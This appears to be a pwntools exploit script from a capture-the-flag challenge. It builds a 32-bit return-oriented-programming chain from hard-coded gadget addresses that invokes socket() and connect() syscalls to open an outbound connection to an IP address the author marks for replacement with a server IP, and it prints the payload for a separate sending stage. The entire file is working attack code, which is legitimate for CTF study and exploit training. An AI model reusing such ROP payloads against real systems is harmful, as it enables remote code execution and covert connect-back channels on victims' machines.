from pwn import *

HOST, PORT = "blacklist.chal.perfect.blue", "1"
HOST, PORT = "127.0.0.1", 31338
r = remote(HOST, PORT)

# Replace this to server IP
addr = bytes([172, 26, 48, 1])


# syscall
sys = 0x806fa30
# pop eax
eax = 0x080a8dc6
# pop edi
edi = 0x08049b1b
# pop ebx
ebx = 0x806f06c
# a writable address
buf = 0x080DA7CA+4

# socket() args
# udp
sc = 0x080D9EC0
# tcp
sc = 0x080D9C18

# ROP again
main = 0x0804891F


a = flat({
    0x10: [
        # SFP. connect(..., ..., rbp)
        0x10,

        # socket(2, 1, 0)
        0x0806f112, sc, 1, eax, 102, sys,

        # pop some registers
        0x08049b19, addr, 0, buf-4,

        # setjmp writes 0x10 bytes to buffer
        # .text:0804E376                 mov     [edx], ebx
        # .text:0804E378                 mov     [edx+4], esi
        # .text:0804E37B                 mov     [edx+8], edi
        # .text:0804E3A0                 mov     [edx+0Ch], ebp
        0x0804E370,
        eax,
        buf,

        # connect(0, buf, 16); it is socketcall(3, buf + 4) and buf + 4 points buf
        0x0806f112, buf + 4, 3, eax, 102, sys,
        main
    ]
})

# phew, this is 100 bytes!
print(hexdump(a))
# stage2.py actually sends the payload